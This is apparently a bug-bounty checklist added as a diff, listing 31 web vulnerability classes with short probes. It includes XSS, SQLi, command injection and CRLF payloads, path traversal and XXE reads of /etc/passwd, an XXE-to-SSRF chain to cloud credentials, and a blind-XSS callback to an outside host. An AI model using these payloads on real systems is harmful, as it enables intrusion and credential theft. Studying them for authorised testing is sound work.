@@ -1,0 +1,81 @@
+checklist link :- https://www.notion.so/Checklist-1-After-Recon-Beginner-s-Friendly-3c861842bae843089205265b4bccfc8d
+
+checklist2 link :- https://www.notion.so/Checklist-2-After-Recon-Deep-Inside-d1d8b2a1692e412f804e34988a0b285f
+
+1.> full path disclosure bug :- remove or change id=1234 to id=blank.
+
+2.> sql injection :- '1-- check sql syntax error.
+
+3.> xss (stored,reflected,self) :- <svg onload=prompt(1)>.
+
+automation:-
+
+cat test.txt        --->> read the file
+| kxss              --->> filter special chars
+| sed 's/=.*/=/'    --->> remove everything after = ,add =
+| sed 's/URL: //'   --->> remove URL: and whitespace
+| dalfox pipe       --->> dalfox tool for xss payload
+-b https://rohitgautam.xss.ht   --->> BXSS Payload adder.
+
+4.> bussiness logic flow :- change price to 0 rs.
+
+5.> rce (remote code execution) :- %7echo"
+
+6.> sub-domain takeover :- find 404 not found.
+
+7.> open url redirection :- change ?to=https://main.com to ?to=https://redacted.com. find redirection through path fragment.
+
+8.> host header injection :- change host,x-forwarded-host e.g. find cache poisoning,password reset poisioning or xss attack.
+
+9.> no rate limit bug :- forget password send email .
+
+10.> file upload + xss in file upload :- upload file(.svg)  , rename file with add xss paload.
+
+11.> email verification bypass :- just capture the request and click again&again and change email verification="false" to "true".
+
+12.> client side password limit validation bypass :- bypass entering  password character limit using inspect element just remove or change "password" to "text". 
+
+13.> html injection :- <h1>test</h1>.
+
+14.> path transversal bug :- test/.\..\.\..\.\..\.\..\.\..\.\..\etc/passwd . 
+
+15.> rate limit bypass :- capture the request and bypass e.g(phn no:- 1233 just add to bypass phn no:- 1233%00 
+
+16.> xxe xml external entity injextion :- use malicious xml code below xml defination in http request. 
+     use payload list in input or input manual payload :- <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> and replace id with " &xxe; ".
+  >> try xxe via img upload using svg img.
+  >> xxe to ssrf :- payload :- <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> ,check the http response the error code reterive the folder name, if you got folder name just add it to end of your payload, Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey.
+  
+17. ssrf :- >> check api or url in http request change the host with http://localhost/admin.
+
+18. parameter tempering :- checkbox,combobox,price,cashback etc.
+
+19. missing spf record :- https://kitterman.com/spf/validate.html or mxtoolbox.com(use spf:example.xom) to check spf record.
+
+20. insecure cors through request header :- find allow-access-control-origin:* or null or evil.com. find if embed?url is present during spidering in burp. after that add origin : any.com in request header and see the response header if vulnerable.
+
+21. source code disclosure :- search "file=" in burp search. eg:- file=img.jpg then replace with file=showimage.php after getting source code find someother information or file path. and if you got another file path then replace with other and may be got something critical.
+
+22. command injection :- use burp intruder with clusterbomb in payload 1 select delimeter.txt and payload 2 select cmd.txt or use ping 127.0.0.1;ls or ;cat /etc/passwd to check. use delimeter to bypass the filter before command :- ; ^ & && | || %0D %0A \n < .
+
+23. csrf :- try on login,logout,or password reset page. just copy logout address and send it to victim.
+
+24. http parameter pollution :- add second urll or a vlaue at the end of main url.
+
+25. content spoofing and text injection :- edit the url which has error,just modify it and check its vulnerable or not.
+
+26. CRLF injection :- %0d%0a using this payload at the place of directory name check if site is vulnerable or not.
+
+payload :- %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8D
+location:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHT\
+ML%29%E5%98%BE
+
+27. 0auth vulnerability :- edit the response type and redirected uri.
+
+28. s3 buckets misconfigurations :- first use dig and ns lookup command to check if subdomain is using aws buckets, now use aws cli basic command to scan ,command :-- aws s3 ls s3://flaws.cloud --no-sign-request --region us-west-2 .
+
+29. web socket vulnerability :- see any live chat like support or bot in website, then intercept the request using burp and see websocket history and see your message reflection,and just change your simple text msg to any xss payoad and just click on send may be the live chat will be vulnerable. another check handshake or hijacking.
+
+30. ssl-poddle script for ssl bug :- use nmap website or tool in terminal to detect ssl bug ,u can use also sslab.com also.
+
+31. client side template injection : use angular brackets after filter. eg :- /?filter={{7*7}} and the output will be 49. if you got this then find payload based on angular version ,u can find it in source code.
